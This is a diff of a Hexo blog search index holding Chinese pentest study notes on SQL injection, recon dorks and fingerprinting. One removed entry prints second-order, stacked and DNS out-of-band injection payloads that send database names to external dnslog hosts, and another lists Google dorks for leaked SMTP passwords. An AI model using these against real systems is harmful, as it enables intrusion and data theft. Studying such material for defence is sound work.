@@ -72,43 +72,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入技巧和要点</title>
-    <url>/2024/03/21/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%92%8C%E8%A6%81%E7%82%B9/</url>
-    <content><![CDATA[<p>SQL注入大致流程：<br>1.考虑闭合问题，闭合前面的单引号，闭合后面的–+<br>2.考虑过滤问题，是否有“;”，SHWO，SELETE和“.”等过滤<br>3.考虑数据库，是否可以同时执行多条SQL语句（16进制需要在完整SQL语句下执行）<br>4.</p>
-<p>SQL注入要点和细节：<br>1.纯数字的表名需要反引号来圈起来<br>2.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先查看当前</span></span><br><span class="line">SHOW TABLES; <span class="comment"># 查看当前数据库下的所有表</span></span><br><span class="line">SELECT column_name FROM table_name; <span class="comment"># 从当前数据库的指定表中查询指定列的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再查看指定</span></span><br><span class="line">SHOW DATABASES; <span class="comment"># 查看所有数据库</span></span><br><span class="line">SHOW TABLES FROM database_name; <span class="comment"># 查看指定数据库下所有的表</span></span><br><span class="line">SHOW COLUMNS FROM database_name.table_name; <span class="comment"># 查看指定数据库中指定表下所有的列，适用于 SQL 注入时检查是否有“.”过滤</span></span><br><span class="line">SHOW COLUMNS FROM table_name IN database_name; <span class="comment"># 查看指定数据库中指定表下所有的列，适用于 SQL 注入时检查是否有“.”过滤</span></span><br><span class="line"></span><br><span class="line">SELECT column_name FROM database_name.table_name; <span class="comment"># 从特定数据库的特定表中查询指定列的数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>SQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hexo网站搭建和命令</title>
-    <url>/2024/03/11/Hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="Hexo搭建和命令参考"><a href="#Hexo搭建和命令参考" class="headerlink" title="Hexo搭建和命令参考"></a><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></h2><!-- 换新电脑参考上面网址 -->
-<!-- 每次备份Blog目录下的source，_config.yml，_config.flexblock.yml，_config.async.yml -->
-<!-- 重装的话在www目录下删除整个Blog文件夹，然后在www文件夹下cmd -->
-
-<ol>
-<li><p>WWW目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>复制备份的source，scaffolds，_config.yml，_config.flexblock.yml，_config.async.yml到Blog目录下<br>删除Blog目录下_config.landscape.yml和theme\flexblock目录下的_config.yml</p>
-</li>
-<li><p>Blog目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>访问本地：<br>hexo g<br>hexo s<br>访问<a href="http://localhost:4000/">本地 4000端口</a></p>
-</li>
-<li><p>上传github：<br>hexo clean<br>hexo g<br>hexo d<br>访问<a href="https://bosaisun.github.io/">Github 网址</a></p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>网站搭建</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Markdown语法</title>
     <url>/2024/03/11/Markdown%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<h2 id="Markdown-官方教程"><a href="#Markdown-官方教程" class="headerlink" title="Markdown 官方教程"></a><a href="https://markdown.com.cn/cheat-sheet.html#%E6%80%BB%E8%A7%88">Markdown 官方教程</a></h2><table>
@@ -186,6 +149,43 @@
 ]]></content>
       <tags>
         <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入技巧和要点</title>
+    <url>/2024/03/21/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7%E5%92%8C%E8%A6%81%E7%82%B9/</url>
+    <content><![CDATA[<p>SQL注入大致流程：<br>1.考虑闭合问题，闭合前面的单引号，闭合后面的–+<br>2.考虑过滤问题，是否有“;”，SHWO，SELETE和“.”等过滤<br>3.考虑数据库，是否可以同时执行多条SQL语句（16进制需要在完整SQL语句下执行）<br>4.</p>
+<p>SQL注入要点和细节：<br>1.纯数字的表名需要反引号来圈起来<br>2.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先查看当前</span></span><br><span class="line">SHOW TABLES; <span class="comment"># 查看当前数据库下的所有表</span></span><br><span class="line">SELECT column_name FROM table_name; <span class="comment"># 从当前数据库的指定表中查询指定列的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再查看指定</span></span><br><span class="line">SHOW DATABASES; <span class="comment"># 查看所有数据库</span></span><br><span class="line">SHOW TABLES FROM database_name; <span class="comment"># 查看指定数据库下所有的表</span></span><br><span class="line">SHOW COLUMNS FROM database_name.table_name; <span class="comment"># 查看指定数据库中指定表下所有的列，适用于 SQL 注入时检查是否有“.”过滤</span></span><br><span class="line">SHOW COLUMNS FROM table_name IN database_name; <span class="comment"># 查看指定数据库中指定表下所有的列，适用于 SQL 注入时检查是否有“.”过滤</span></span><br><span class="line"></span><br><span class="line">SELECT column_name FROM database_name.table_name; <span class="comment"># 从特定数据库的特定表中查询指定列的数据</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>SQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo网站搭建和命令</title>
+    <url>/2024/03/11/Hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="Hexo搭建和命令参考"><a href="#Hexo搭建和命令参考" class="headerlink" title="Hexo搭建和命令参考"></a><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></h2><!-- 换新电脑参考上面网址 -->
+<!-- 每次备份Blog目录下的source，_config.yml，_config.flexblock.yml，_config.async.yml -->
+<!-- 重装的话在www目录下删除整个Blog文件夹，然后在www文件夹下cmd -->
+
+<ol>
+<li><p>WWW目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>复制备份的source，scaffolds，_config.yml，_config.flexblock.yml，_config.async.yml到Blog目录下<br>删除Blog目录下_config.landscape.yml和theme\flexblock目录下的_config.yml</p>
+</li>
+<li><p>Blog目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问本地：<br>hexo g<br>hexo s<br>访问<a href="http://localhost:4000/">本地 4000端口</a></p>
+</li>
+<li><p>上传github：<br>hexo clean<br>hexo g<br>hexo d<br>访问<a href="https://bosaisun.github.io/">Github 网址</a></p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>网站搭建</tag>
       </tags>
   </entry>
   <entry>
@@ -387,6 +387,14 @@
       </categories>
   </entry>
   <entry>
+    <title>注入工具&amp;SQLMAP&amp;Tamper编写&amp;指纹修改&amp;高权限操作&amp;目录架构</title>
+    <url>/2024/03/22/Web%E6%94%BB%E9%98%B26/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>Web攻防</category>
+      </categories>
+  </entry>
+  <entry>
     <title>PHP应用&amp;SQL注入&amp;符号拼接&amp;请求方法&amp;HTTP头&amp;JSON&amp;编码类</title>
     <url>/2024/03/17/Web%E6%94%BB%E9%98%B23/</url>
     <content><![CDATA[<h2 id="PHP-MYSQL-数据请求类型"><a href="#PHP-MYSQL-数据请求类型" class="headerlink" title="PHP-MYSQL-数据请求类型"></a>PHP-MYSQL-数据请求类型</h2><p>SQL语句由于在黑盒中是无法预知写法的，SQL注入能发成功是需要拼接原SQL语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原SQL语句的未知性导致的拼接失败！<br><br></p>
@@ -451,61 +459,6 @@
       <categories>
         <category>Web攻防</category>
       </categories>
-  </entry>
-  <entry>
-    <title>PHP应用&amp;SQL二次注入&amp;堆叠执行&amp;DNS带外&amp;功能点&amp;黑白盒条件</title>
-    <url>/2024/03/21/Web%E6%94%BB%E9%98%B25/</url>
-    <content><![CDATA[<h2 id="PHP-MYSQL-二次注入-DEMO-74CMS"><a href="#PHP-MYSQL-二次注入-DEMO-74CMS" class="headerlink" title="PHP-MYSQL-二次注入-DEMO&amp;74CMS"></a>PHP-MYSQL-二次注入-DEMO&amp;74CMS</h2><ol>
-<li>DEMO-用户注册登录修改密码</li>
-<li>CMS-74CMS个人中心简历功能</li>
-</ol>
-<p><strong>黑盒思路</strong>：分析代码功能，有INSERT后对数据操作的地方（功能点）<br><strong>白盒思路</strong>：INSERT后进入SELECT或UPDATE的功能的代码部分<br><strong>注入条件</strong>：插入时有转义的函数或配置，能过后续继续利用INSERT的数据<br><br></p>
-<p>登录后修改，系统会直接直接获取当前登录的用户名当修改条件</p>
-<p>如果此用户名在注册的时候是SQL注入语句，就能过提前将代码插入到数据中，然后当系统调用数据的时候，连接形成二次注入语句。需要注意，如果对面代码开了转移的函数，无法插入数据</p>
-<br>
-
-<p><strong>关键点</strong>：在插入的时候需要函数转义或者魔术开关转义，没有的话INSERT注入语句就都注入不进去</p>
-<p>首先得知道有没有转义，然后知道有没有单引号，括号，然后插入进去再找在哪触发，一般是看源码代码审计发现的。<br><br></p>
-<p>原本SQL语句：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">INSERT INTO <span class="built_in">users</span>(username，password) VALUES (<span class="string">&#x27;username&#x27;</span>, <span class="variable">$password</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
-
-<p>将在用户名处写的注入语句带入原本SQL语句</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;admin&#x27;</span> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">Insert into <span class="built_in">users</span>(username，password) vaules(<span class="string">&#x27;admin&#x27;</span> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<span class="comment">#&#x27;, $password&#x27;)</span></span><br></pre></td></tr></table></figure>
-
-<p>但是写入之后，#注释掉了之后的内容，导致password的参数传不上去，就会报错。但是如果去掉了单引号和后面的#号，这个注入语句能写入，但是是以字符串的形式写入的</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Insert into <span class="built_in">users</span>(username，password) vaules(<span class="string">&#x27;admin and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)&#x27;</span>, <span class="variable">$password</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
-
-<p>然后，系统将<code>admin and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)</code>作为账号存入数据库</p>
-<p>函数转义或者魔术开关本意是为了拦截一次注入的，会将单引号前面加上\，注释掉单引号使攻击语句出错，但是这样就给了二次注入机会来插入到数据库中，然后再调用的数据的时候触发语句达成目的<br><br></p>
-<h2 id="PHP-MYSQL-堆叠注入-DEMO-CTF强网"><a href="#PHP-MYSQL-堆叠注入-DEMO-CTF强网" class="headerlink" title="PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网"></a>PHP-MYSQL-堆叠注入-DEMO&amp;CTF强网</h2><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条sql语句</p>
-<p>例如PHP中的<code>mysqli_multi_query</code>函数和<code>mysqli_query()</code>函数。</p>
-<p>所以要想目标存在堆叠注入，在目标主机存在类似于mysqli_multi_query()这样的函数，根据数据库类型决定是否支持多条语句执行.<br><br></p>
-<p>例如：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.0.1.139:80/sqli/test.php?<span class="built_in">id</span>=1;create table cypher(personalid int);</span><br></pre></td></tr></table></figure>
-<br>
-
-
-<p><a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a><br><br></p>
-<p>1、目标存在sql注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条sql语句<br>支持堆叠数据库：MYSQL MSSQL Postgresql等</p>
-<h2 id="PHP-MYSQL-带外注入-DEMO-DNSLOG"><a href="#PHP-MYSQL-带外注入-DEMO-DNSLOG" class="headerlink" title="PHP-MYSQL-带外注入-DEMO&amp;DNSLOG"></a>PHP-MYSQL-带外注入-DEMO&amp;DNSLOG</h2><ol start="0">
-<li><p>注入条件<br>ROOT高权限且支持load_file()，需要同时满足两个要求，条件太苛刻了<br>有部分注入点是没有回显的，所有读取也是没回显的，所以采用带外</p>
-</li>
-<li><p>使用平台<br><a href="https://dig.pm/">https://dig.pm/</a></p>
-</li>
-<li><p>带外应用场景：<br>解决不回显，反向连接，SQL注入，命令执行，SSRF等</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询当前数据库</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.d7a64120ce.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前版本</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> version()),<span class="string">&#x27;.ac45c0ae7c.ipv6.1433.eu.org/abc&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询其他数据库</span></span><br><span class="line"><span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> schema_name from information_schema.schemata <span class="built_in">limit</span> 0,1),<span class="string">&quot;.dbuh8a.ceye.io\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前数据库demo01中第一个表名</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 0,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询当前数据库demo01中第二个表名</span></span><br><span class="line">10.0.1.139/sqli/new.php?<span class="built_in">id</span>=1 and load_file(concat(<span class="string">&quot;\\\\&quot;</span>,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> <span class="built_in">limit</span> 1,1 ),<span class="string">&quot;.ac45c0ae7c.ipv6.1433.eu.org\\xxx.txt&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<br>limit 0,1 查询第一个数据库名<br>limit 1,1 查询第二个数据库名<br>limit 2,1 查询第三个数据库名</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Web攻防</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Web</title>
-    <url>/2024/03/22/Web%E6%94%BB%E9%98%B26/</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>Web应用&amp;企业产权&amp;指纹识别&amp;域名资产&amp;网络空间&amp;威胁情报</title>
@@ -816,6 +769,120 @@
       </categories>
   </entry>
   <entry>
+    <title>公众号服务&amp;Github监控&amp;供应链&amp;网盘泄漏&amp;证书图标邮箱资产</title>
+    <url>/2024/03/12/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B910/</url>
+    <content><![CDATA[<h2 id="微信公众号-获取-三方服务"><a href="#微信公众号-获取-三方服务" class="headerlink" title="微信公众号-获取&amp;三方服务"></a>微信公众号-获取&amp;三方服务</h2><ol>
+<li>获取微信公众号<a href="https://weixin.sogou.com/">搜狗搜索</a></li>
+<li>查询微信公众号有无第三方服务</li>
+</ol>
+<p>有些是微信公众号个人企业，看看是否用的腾讯的网站功能接口，还是用的自己的网站<br><br></p>
+<h2 id="Github监控-开发-配置-源码"><a href="#Github监控-开发-配置-源码" class="headerlink" title="Github监控-开发&amp;配置&amp;源码"></a>Github监控-开发&amp;配置&amp;源码</h2><p>目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点<br><br></p>
+<p>人员&amp;域名&amp;邮箱等筛选语法网站<br>eg：xxx.cn password in:file<br><br></p>
+<p><a href="https://gitee.com/">Gitee</a></p>
+<p><a href="https://github.com/">Github</a></p>
+<p><a href="https://www.huzhan.com/">互站网</a></p>
+<br>
+
+<p>GITHUB资源搜索语法：</p>
+<table>
+<thead>
+<tr>
+<th>查询类型</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>仓库标题搜索含有关键字</td>
+<td><code>in:name test</code></td>
+</tr>
+<tr>
+<td>仓库描述搜索含有关键字</td>
+<td><code>in:description test</code></td>
+</tr>
+<tr>
+<td>Readme文件搜索含有关键字</td>
+<td><code>in:readme test</code></td>
+</tr>
+<tr>
+<td>stars数量大于3000的搜索关键字</td>
+<td><code>stars:&gt;3000 test</code></td>
+</tr>
+<tr>
+<td>stars数量在1000到3000的搜索关键字</td>
+<td><code>stars:1000..3000 test</code></td>
+</tr>
+<tr>
+<td>forks数量大于1000的搜索关键字</td>
+<td><code>forks:&gt;1000 test</code></td>
+</tr>
+<tr>
+<td>forks数量在1000到3000的搜索关键字</td>
+<td><code>forks:1000..3000 test</code></td>
+</tr>
+<tr>
+<td>仓库大小大于5000k的搜索关键字</td>
+<td><code>size:&gt;=5000 test</code></td>
+</tr>
+<tr>
+<td>发布时间大于2019-02-12的搜索关键字</td>
+<td><code>pushed:&gt;2019-02-12 test</code></td>
+</tr>
+<tr>
+<td>创建时间大于2019-02-12的搜索关键字</td>
+<td><code>created:&gt;2019-02-12 test</code></td>
+</tr>
+<tr>
+<td>用户名搜索</td>
+<td><code>user:test</code></td>
+</tr>
+<tr>
+<td>指定LICENSE搜索关键字</td>
+<td><code>license:apache-2.0 test</code></td>
+</tr>
+<tr>
+<td>在特定语言的代码中搜索关键字</td>
+<td><code>language:java test</code></td>
+</tr>
+<tr>
+<td>组合搜索</td>
+<td><code>user:test in:name test</code></td>
+</tr>
+</tbody></table>
+<br>
+<br>
+
+<p><strong>GITHUB关键字配合谷歌搜索</strong>：</p>
+<p>site:Github.com smtp   </p>
+<p>site:Github.com smtp @qq.com   </p>
+<p>site:Github.com smtp @126.com   </p>
+<p>site:Github.com smtp @163.com   </p>
+<p>site:Github.com smtp @sina.com.cn </p>
+<p>site:Github.com smtp password </p>
+<p>site:Github.com String password smtp</p>
+<br>
+
+<p><strong>GITHUB语法固定长期后续监控新泄露</strong></p>
+<p>基于关键字监控</p>
+<p>基于项目规则监控</p>
+<p><a href="https://github.com/madneal/gshark">gshark</a></p>
+<p><a href="https://github.com/NHPT/FireEyeGoldCrystal">FireEyeGoldCrystal</a></p>
+<p><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a><br><br></p>
+<h2 id="网盘资源搜索-全局文件机密"><a href="#网盘资源搜索-全局文件机密" class="headerlink" title="网盘资源搜索-全局文件机密"></a>网盘资源搜索-全局文件机密</h2><p>主要就是查看网盘中是否存有目标的敏感文件</p>
+<p>如：企业招标，人员信息，业务产品，应用源码等<br><br></p>
+<h2 id="网络空间进阶-证书-图标-邮箱"><a href="#网络空间进阶-证书-图标-邮箱" class="headerlink" title="网络空间进阶-证书&amp;图标&amp;邮箱"></a>网络空间进阶-证书&amp;图标&amp;邮箱</h2><p><strong>证书资产搜索</strong>，进阶</p>
+<p>fofa quake hunter<br><br></p>
+<p><strong>ICO资产搜索</strong>，进阶</p>
+<p>fofa quake hunter</p>
+<p>下载目标图标，再在网络空间搜索，获得资源<br><br></p>
+<p><strong>邮箱资产搜索</strong>，进阶</p>
+<p><a href="https://hunter.io/">Hunter</a></p>
+<p>搜索xxx.edu.cn来获得大量邮箱，然后通过邮箱信息进行爆破</p>
+]]></content>
+      <categories>
+        <category>信息打点</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Web应用&amp;源码泄漏&amp;开源闭源&amp;指纹识别&amp;GIT&amp;SVN&amp;DS&amp;备份</title>
     <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B92/</url>
     <content><![CDATA[<h2 id="后端-开源-指纹识别-源码下载"><a href="#后端-开源-指纹识别-源码下载" class="headerlink" title="后端-开源-指纹识别-源码下载"></a>后端-开源-指纹识别-源码下载</h2><table>
@@ -966,120 +1033,6 @@
 <p>site:Github.com smtp @sina.com.cn </p>
 <p>site:Github.com smtp password </p>
 <p>site:Github.com String password smtp</p>
-]]></content>
-      <categories>
-        <category>信息打点</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>公众号服务&amp;Github监控&amp;供应链&amp;网盘泄漏&amp;证书图标邮箱资产</title>
-    <url>/2024/03/12/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B910/</url>
-    <content><![CDATA[<h2 id="微信公众号-获取-三方服务"><a href="#微信公众号-获取-三方服务" class="headerlink" title="微信公众号-获取&amp;三方服务"></a>微信公众号-获取&amp;三方服务</h2><ol>
-<li>获取微信公众号<a href="https://weixin.sogou.com/">搜狗搜索</a></li>
-<li>查询微信公众号有无第三方服务</li>
-</ol>
-<p>有些是微信公众号个人企业，看看是否用的腾讯的网站功能接口，还是用的自己的网站<br><br></p>
-<h2 id="Github监控-开发-配置-源码"><a href="#Github监控-开发-配置-源码" class="headerlink" title="Github监控-开发&amp;配置&amp;源码"></a>Github监控-开发&amp;配置&amp;源码</h2><p>目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息（密码密匙等），人员数据库等敏感信息，找到多个脆弱点<br><br></p>
-<p>人员&amp;域名&amp;邮箱等筛选语法网站<br>eg：xxx.cn password in:file<br><br></p>
-<p><a href="https://gitee.com/">Gitee</a></p>
-<p><a href="https://github.com/">Github</a></p>
-<p><a href="https://www.huzhan.com/">互站网</a></p>
-<br>
-
-<p>GITHUB资源搜索语法：</p>
-<table>
-<thead>
-<tr>
-<th>查询类型</th>
-<th>示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>仓库标题搜索含有关键字</td>
-<td><code>in:name test</code></td>
-</tr>
-<tr>
-<td>仓库描述搜索含有关键字</td>
-<td><code>in:description test</code></td>
-</tr>
-<tr>
-<td>Readme文件搜索含有关键字</td>
-<td><code>in:readme test</code></td>
-</tr>
-<tr>
-<td>stars数量大于3000的搜索关键字</td>
-<td><code>stars:&gt;3000 test</code></td>
-</tr>
-<tr>
-<td>stars数量在1000到3000的搜索关键字</td>
-<td><code>stars:1000..3000 test</code></td>
-</tr>
-<tr>
-<td>forks数量大于1000的搜索关键字</td>
-<td><code>forks:&gt;1000 test</code></td>
-</tr>
-<tr>
-<td>forks数量在1000到3000的搜索关键字</td>
-<td><code>forks:1000..3000 test</code></td>
-</tr>
-<tr>
-<td>仓库大小大于5000k的搜索关键字</td>
-<td><code>size:&gt;=5000 test</code></td>
-</tr>
-<tr>
-<td>发布时间大于2019-02-12的搜索关键字</td>
-<td><code>pushed:&gt;2019-02-12 test</code></td>
-</tr>
-<tr>
-<td>创建时间大于2019-02-12的搜索关键字</td>
-<td><code>created:&gt;2019-02-12 test</code></td>
-</tr>
-<tr>
-<td>用户名搜索</td>
-<td><code>user:test</code></td>
-</tr>
-<tr>
-<td>指定LICENSE搜索关键字</td>
-<td><code>license:apache-2.0 test</code></td>
-</tr>
-<tr>
-<td>在特定语言的代码中搜索关键字</td>
-<td><code>language:java test</code></td>
-</tr>
-<tr>
-<td>组合搜索</td>
-<td><code>user:test in:name test</code></td>
-</tr>
-</tbody></table>
-<br>
-<br>
-
-<p><strong>GITHUB关键字配合谷歌搜索</strong>：</p>
-<p>site:Github.com smtp   </p>
-<p>site:Github.com smtp @qq.com   </p>
-<p>site:Github.com smtp @126.com   </p>
-<p>site:Github.com smtp @163.com   </p>
-<p>site:Github.com smtp @sina.com.cn </p>
-<p>site:Github.com smtp password </p>
-<p>site:Github.com String password smtp</p>
-<br>
-
-<p><strong>GITHUB语法固定长期后续监控新泄露</strong></p>
-<p>基于关键字监控</p>
-<p>基于项目规则监控</p>
-<p><a href="https://github.com/madneal/gshark">gshark</a></p>
-<p><a href="https://github.com/NHPT/FireEyeGoldCrystal">FireEyeGoldCrystal</a></p>
-<p><a href="https://github.com/Explorer1092/Github-Monitor">Github-Monitor</a><br><br></p>
-<h2 id="网盘资源搜索-全局文件机密"><a href="#网盘资源搜索-全局文件机密" class="headerlink" title="网盘资源搜索-全局文件机密"></a>网盘资源搜索-全局文件机密</h2><p>主要就是查看网盘中是否存有目标的敏感文件</p>
-<p>如：企业招标，人员信息，业务产品，应用源码等<br><br></p>
-<h2 id="网络空间进阶-证书-图标-邮箱"><a href="#网络空间进阶-证书-图标-邮箱" class="headerlink" title="网络空间进阶-证书&amp;图标&amp;邮箱"></a>网络空间进阶-证书&amp;图标&amp;邮箱</h2><p><strong>证书资产搜索</strong>，进阶</p>
-<p>fofa quake hunter<br><br></p>
-<p><strong>ICO资产搜索</strong>，进阶</p>
-<p>fofa quake hunter</p>
-<p>下载目标图标，再在网络空间搜索，获得资源<br><br></p>
-<p><strong>邮箱资产搜索</strong>，进阶</p>
-<p><a href="https://hunter.io/">Hunter</a></p>
-<p>搜索xxx.edu.cn来获得大量邮箱，然后通过邮箱信息进行爆破</p>
 ]]></content>
       <categories>
         <category>信息打点</category>
@@ -1522,6 +1475,68 @@
       </categories>
   </entry>
   <entry>
+    <title>语言框架&amp;开发组件&amp;FastJson&amp;Shiro&amp;Log4j&amp;SpringBoot等</title>
+    <url>/2024/03/10/%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B96/</url>
+    <content><![CDATA[<h2 id="重点知识-框架-Web-前端-后端"><a href="#重点知识-框架-Web-前端-后端" class="headerlink" title="重点知识-框架&amp;Web&amp;前端&amp;后端"></a>重点知识-框架&amp;Web&amp;前端&amp;后端</h2><p><strong>框架</strong>：简单代码的一个整合库，如果使用框架就只需要学习使用如何调用框架即可</p>
+<p>例如：文件上传功能是需要很多代码来实现的，框架意思是把这个代码进行封封装，以后调用就可以了</p>
+<p><strong>影响</strong>：如果采用框架开发，代码的安全性是取决于框架的过滤机制</p>
+<p><strong>组件</strong>：第三方的功能模块（日志记录，数据监控，数据转换等）<br><br></p>
+<p><strong>Web架构</strong>：</p>
+<ol>
+<li>最简单最入门的开发模型（功能代码全部手写）<br>最容易出现漏洞，因为程序员水平不一，没有第三方或团队的检查代码，单纯的自己写</li>
+<li>结合开发框架的开发模型（以框架为核心实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）</li>
+<li>结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）<br>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）<br>
+<br></li>
+</ol>
+<p><strong>前端</strong><br><strong>JS 框架</strong>：爬取更多的JS从里面筛选URL或敏感泄漏Key等，也可以通过对JS代码逻辑进行代码审计</p>
+<p><strong>组件</strong>：Java居多，常见报过有安全漏洞组件（shiro solr log4j sprintboot等）</p>
+<p><strong>框架</strong>：PHP Java Python都有<br><br></p>
+<p><strong>后端</strong><br><strong>CMS识别</strong>：一般PHP开发居多（利用源码程序名去搜漏洞情况，或者下载源码去进行后期的代码审计）<br><br></p>
+<h2 id="指纹识别-本地工具-gotoScan（CMSEEK）"><a href="#指纹识别-本地工具-gotoScan（CMSEEK）" class="headerlink" title="指纹识别-本地工具-gotoScan（CMSEEK）"></a>指纹识别-本地工具-gotoScan（CMSEEK）</h2><ol>
+<li><a href="https://github.com/newbe3three/gotoscan">gotoscan</a>，本地工具适用于内网和外网环境</li>
+<li>网络空间：Fofa Quake Hunter</li>
+<li>网络空间：IO图标关系<br>
+<br></li>
+</ol>
